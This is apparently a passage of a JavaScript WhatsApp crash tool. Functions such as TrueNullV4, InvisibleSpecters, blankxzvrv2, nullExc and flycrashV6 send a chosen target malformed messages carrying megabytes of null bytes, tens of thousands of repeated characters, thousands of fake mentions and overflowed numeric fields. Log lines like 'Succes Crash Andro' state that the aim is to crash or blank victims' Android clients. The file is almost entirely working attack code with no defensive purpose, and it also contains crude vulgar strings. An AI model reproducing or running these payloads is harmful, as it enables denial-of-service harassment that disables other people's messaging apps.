        message: Null.message
      }
    },
    mention
      ? { messageId: Null.key.id, participant: { jid: target } }
      : { messageId: Null.key.id }
  );

  console.log(chalk.red(`Succes : ${target}`));
}

async function Truenullv4(sock, target, ptcp = true) {
  const VidMessage = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "target",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: VidMessage.message,
     },
    }, ptcp ? 
    { 
      messageId: VidMessage.key.id, 
      participant: { jid: target} 
    } : { messageId: VidMessage.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "X", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target} 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: target} 
    } : { messageId: payload2.key.id }
  );
}


async function amountOne(target) {
  const vnx = {
    requestPaymentMessage: {
      amount: {
       value: 1,
       offset: 0,
       currencyCodeIso4217: "IDR",
       requestFrom: target,
       expiryTimestamp: Date.now() + 8000
      },
      contextInfo: {
        externalAdReply: {
          title: null,
          body: "X".repeat(1500),
          mimetype: "audio/mpeg",
          caption: "X".repeat(1500),
          showAdAttribution: true,
          sourceUrl: null,
          thumbnailUrl: null
        }
      }
    }
  };
    
    let msg1 = {
    interactiveMessage: {
      header: {
        title: "Null",
        subtitle: "ꦾ".repeat(10000),
        hasMediaAttachment: false
      },
      body: {
        text: "ꦾ".repeat(20000)
      },
      footer: {
        text: "ꦾ".repeat(20000)
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "ꦾ".repeat(20000),
              sections: [
                {
                  title: "ꦾ".repeat(5000),
                  rows: [
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    }
                  ]
                },
                {
                  title: "ꦾ".repeat(20000) + "bokep simulator",
                  rows: [
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "VNX UYYY", 
                      description: "\u0000".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    }
                  ]
                }
              ]
            })
          }
        ]
      }
    }
  };
  
  
  await sock.relayMessage(target, vnx, msg1, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
}

async function TrueNullV4(sock, target, X) {
try {
const msgInteractive = generateWAMessageFromContent(Number, {
interactiveResponseMessage: {
contextInfo: { mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`) },
body: { text: "\u0000".repeat(200), format: "DEFAULT" },
nativeFlowResponseMessage: {
name: "address_message",
paramsJson: `{"values":{"in_pin_code":"999999","building_name":"X","landmark_area":"X","address":"X","tower_number":"Y7d","city":"X","name":"X","phone_number":"999999999","house_number":"xxx","floor_number":"xxx","state":"D | ${"\u0000".repeat(900000)}"}}`,
version: 3
}
}
}, {});

const mentionedList = [
"13135550002@s.whatsapp.net",
...Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
];

const videoMessage = {
url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
mimetype: "video/mp4",
fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
fileLength: "289511",
seconds: 15,
mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
caption: "floor_number",
height: 640,
width: 640,
fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
mediaKeyTimestamp: "1743848703",
contextInfo: { isSampled: true, mentionedJid: mentionedList },
forwardedNewsletterMessageInfo: {
newsletterJid: "120363321780343299@newsletter",
serverMessageId: 1,
newsletterName: "floor_number"
},
annotations: [{
embeddedContent: {
embeddedMusic: {
musicContentMediaId: "589608164114571",
songId: "870166291800508",
author: "X" + "floor_number".repeat(10000),
title: "X"
}
},
embeddedAction: true
}]
};

const msgVideo = generateWAMessageFromContent(target, {
viewOnceMessage: { message: { videoMessage } }
}, {});

await sock.relayMessage(
target,
{ groupStatusMessageV2: { message: msgInteractive.message } },
X ? { messageId: msgInteractive.key.id, participant: { jid: target } } : { messageId: msgInteractive.key.id }
);

await sock.relayMessage("status@broadcast", msgVideo.message, {
messageId: msgVideo.key.id,
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }]
}]
});
const module = {
message: {
ephemeralMessage: {
message: {
audioMessage: {
url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
mimetype: "audio/mpeg",
fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
fileLength: 999999999999999999,
seconds: 9999999999999999999,
ptt: true,
mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
mediaKeyTimestamp: 99999999999999,
contextInfo: {
mentionedJid: [
"13300350@s.whatsapp.net",
Number,
...Array.from({ length: 1900 }, () =>
`1${Math.floor(Math.random() * 9e7)}@s.whatsapp.net`
)
]
}
}
}
}
}
};

const Content = generateWAMessageFromContent(target, module.message, { userJid: target });

await sock.relayMessage("status@broadcast", Content.message, {
messageId: Content.key.id,
statusJidList: [target]
});

} catch (e) {
console.error(e);
}
}

async function InvisibleSpecters(sock, target) {
  const  msgpler = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const msg2 = generateWAMessageFromContent(
    target,
    msgpler.message,
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  
  const xwarpler = generateWAMessageFromContent(
    target,
    { ephemeralMessage: { message: { Xwarpler1 } } },
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", xwarpler.message, {
    messageId: xwarpler.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  
  const PaymentMessage = generateWAMessageFromContent(
    "status@broadcast",
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "X", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", PaymentMessage.message, {
    messageId: PaymentMessage.key.id,
    statusJidList: [target]
  });
  
   await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "X",
              format: "BOLD"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(10450000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );
  console.log(chalk.red(`𝗫𝗪𝗔𝗥 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚 ${target}`));
}

async function blankxzvrv2(sock, target) {
    const xwarxara = await generateWaMessageFromcontent(target,  {
    message: {
      interactiveMessage: {
        header: {
          documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            fileLength: "1402222",
            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            fileName: "xwarrxxx.js",
            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            directPath: "//v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
            mediaKeyTimestamp: `1750124469`
          },
          hasMediaAttachment: true
        },
        body: {
          text: "Ӿ₩₳ɽɽ Ł₴ Ⱨɇɽɇɇɇɇ" + "{".repeat(70000)
        },
        nativeFlowMessage: {
              messageParamsJson: "{".repeat(90000)
        },
        contextInfo: {
          mentionedJid: [target],
          groupMentions: [
            {
              groupJid: target,
              groupSubject: "ALL_CHAT",
              groupMetadata: {
                creationTimestamp: Date.now(),
                ownerJid: "1@s.whatsapp.net",
                adminJids: ["1@s.whatsapp.net", "1@s.whatsapp.net"]
              }
            }
          ],
          externalContextInfo: {
            customTag: "₣ʉ₵₭ Ɏøʉ ฿ɽøøøø",
            securityLevel: 0,
            referenceCode: 9741,
            timestamp: 9741,
            messageId: `MSG_${Math.random().toString(36).slice(2)}`,
            userId: "global"
          },
          isForwarded: true,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "1402222",
              pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
              mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
              fileName: "xwarrrx.js",
              fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1750124469
            }
          }
        }
      }
    }
  }, {});
      await sock.relayMessage(target, xwarxara.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
   
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: ".",
                        locationMessage: {},
                        hasMediaAttachment: true
                    },
                    body: {
                        text: " null " + "\0".repeat(900000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "\0"
                    },
                    carouselMessage: {}
                }
            }
        }
    }, { participant: { jid: target } });
  
  console.log(`Succes Send Bug Blank Android ${target}`);
  
}

async function payNulL(target) {
  const message = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      expiryTimestamp: null,
      amount: {
        value: 9999999999,
        offset: 9999999999,
        currencyCode: 'IDR'
      },
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        remoteJid: target,
        externalAdReply: {
          title: "Me Xata",
          body: "Me Xata",
          mimetype: 'image',
          caption: "Valortant",
          showAdAttribution: true,
          sourceUrl: "https://t.me/xatanicvxii",
          thumbnailUrl: {
            url: "https://files.catbox.moe/rg3jer.png"
          }
        }
      }
    }
  };

  await sock.relayMessage(target, message, { messageId: null });
}

async function reqpayment(target) {
  const message = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      requestFrom: target,
      expiryTimestamp: null,
      amount: {
        value: 9999999999,
        offset: 9999999999,
        currencyCode: 'IDR'
      },
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        fromMe: false,
        remoteJid: "status@broadcast",
        externalAdReply: {
          title: "Me Xata",
          body: "Me Xata",
          mimetype: 'image',
          caption: "Valortant",
          showAdAttribution: true,
          sourceUrl: 'https://t.me/xatanicvxii',
          thumbnailUrl: {
            url: "https://files.catbox.moe/rg3jer.png"
          }
        }
      }
    }
  };

  await sock.relayMessage(
    target,
    message,
    {
      statusJidList: [target],
      remoteJid: "status@broadcast"
    }
  );
}

async function nullExc(sock, target, mention = true) {
  try {
    let payload = {
      requestPaymentMessage: {
        currencyCodeIso4217: 'IDR',
        requestFrom: target,
        expiryTimestamp: null,
        contextInfo: {
          isForwarded: true,
          forwardingScore: 999,
          forwardedNewsletterMessageInfo: {
            newsletterName: "MampusKontol",
            newsletterJid: "1@newsletter"
          }
        }
      }
    };
    
    let msg = generateWAMessageFromContent(target, {
      requestPaymentMessage: payload.requestPaymentMessage
    }, {});
    
    
    await sock.relayMessage(target, msg.message, mention ? {
      messageId: msg.key.id,
      participant: { jid: target },
      userJid: target
    } : {
      messageId: msg.key.id
    });
    
    console.log(`Succes Crash Andro ${target}`);
  } catch (error) {
    console.error(`[nullExc] Error:`, error.message);
    throw error; 
  }
}

async function TrueNullv3(sock, target) {
  const module = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const Content = generateWAMessageFromContent(
    target,
    module.message,
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", Content.message, {
    messageId: Content.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  const viewOnceMsg = generateWAMessageFromContent(
    "status@broadcast",
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "X", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage("status@broadcast", viewOnceMsg.message, {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target]
  });
  const ButtonMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
    mimetype: "audio/mpeg",
    fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
    fileLength: 9999999999,
    seconds: 999999999999,
    ptt: true,
    mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
    fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
    directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
    mediaKeyTimestamp: 99999999999999,
    waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==",
    contextInfo: {
      mentionedJid: [
        "1@s.whatsapp.net",
        target,
        ...Array.from({ length: 9999 }, () =>
          `1${Math.floor(Math.random() * 9e7)}@s.whatsapp.net`
        )
      ],
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "1@newsletter",
        serverMessageId: 1,
        newsletterName: "X"
      }
    }
  };

  const msg = generateWAMessageFromContent(
    target,
    { ephemeralMessage: { message: { ButtonMessage } } },
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  const PaymentMessage = generateWAMessageFromContent(
    "status@broadcast",
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "X", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1_000_000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", PaymentMessage.message, {
    messageId: PaymentMessage.key.id,
    statusJidList: [target]
  });

  console.log(chalk.red(`Succes Send ${target}`));
}

async function ExploreJid(sock, target) {
  try {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, y) => `6285983729${y + 1}@s.whatsapp.net`
          )
        },
        body: {
          text: "X",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{"flow_cta":"${"\u0000".repeat(900000)}"}`
        },
        version: 3
      }
    }, {});
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      { messageId: msg.key.id }
    );
  } catch (e) {
  }
  const Jid = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 999.99999999,
          degreesLongitude: 999.99999999,
          caption: "X",
        },
        contextInfo: {
          mentionedJid: [
            target,
            ...Array.from(
              { length: 3000 },
              () =>
                "1" +
                Math.floor(Math.random() * 500000) +
                "@s.whatsapp.net"
            ),
          ],
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: false
        }
      }
    }
  };

  const participant = generateWAMessageFromContent(target, Jid, {});  

  await sock.relayMessage("status@broadcast", participant.message, {  
    messageId: participant.key.id,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [  
              {  
                tag: "to",  
                attrs: { jid: target },  
                content: undefined  
              }  
            ]  
          }  
        ]  
      }  
    ]  
  });
}

async function TrueNull(sock, target) {
  const module = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const Content = generateWAMessageFromContent(
    target,
    module.message,
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", Content.message, {
    messageId: Content.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target } }
            ]
          }
        ]
      }
    ]
  });
  const viewOnceMsg = generateWAMessageFromContent(
  "status@broadcast",
  {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "X",
            format: "BOLD"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        }
      }
    }
  },
  {}
);
await sock.relayMessage(
  "status@broadcast",
  viewOnceMsg.message,
  {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target]
  }
);
console.log(chalk.red(`Succes Send ${target}`));
}


async function flycrashV6(sock, target, mention = true) {
    let NarativeMsg = generateWAMessageFromContent(target, {
        interactiveResponseMessage: {
            contextInfo: {
                mentionedJid: Array.from({ length: 100 }, (_, r) => `1${r + 1}@s.whatsapp.net`)
            },
            body: {
                text: "T",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}`
            },
            version: 3
        }
    }, {});

    await sock.relayMessage(
        target,
        {
            groupStatusMessageV2: {
                message: NarativeMsg.message
            }
        },
        mention
            ? { messageId: NarativeMsg.key.id, participant: { jid: target } }
            : { messageId: NarativeMsg.key.id }
    );
    console.log(chalk.red(`Succes Send Force ${target}`));
    try {
        const jid = String(target).includes("@s.whatsapp.net")
            ? String(target)
            : `${String(target).replace(/\D/g, "")}@s.whatsapp.net`;

        const muteGroup = () => {
            let map = {};
            return {
                mutex(key, fn) {
                    map[key] ??= { task: Promise.resolve() };
                    map[key].task = (async (prev) => {
                        try { await prev; } catch { }
                        return fn();
                    })(map[key].task);
                    return map[key].task;
                }
            };
        };

        const bufferMute = muteGroup();
        const payload = (buf) =>
            Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
        const yntkts = encodeSignedDeviceIdentity;

        sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
            if (!recipientJids.length)
                return { nodes: [], shouldIncludeDeviceIdentity: false };

            const patched = (await sock.patchMessageBeforeSending?.(message, recipientJids)) ?? message;

            const ywdh = Array.isArray(patched)
                ? patched
                : recipientJids.map((j) => ({
                    recipientJid: j,
                    message: patched
                }));

